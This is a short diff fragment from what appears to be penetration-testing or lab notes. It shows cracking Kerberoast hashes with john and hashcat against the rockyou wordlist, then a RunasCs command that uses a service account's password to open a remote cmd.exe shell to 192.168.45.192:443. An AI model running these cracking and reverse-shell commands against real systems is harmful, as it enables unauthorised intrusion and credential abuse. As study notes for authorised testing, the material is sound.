@@ -978,6 +978,7 @@ john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
 
 # 
+
 .\Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" -Remote 192.168.45.192:443
 
 ```
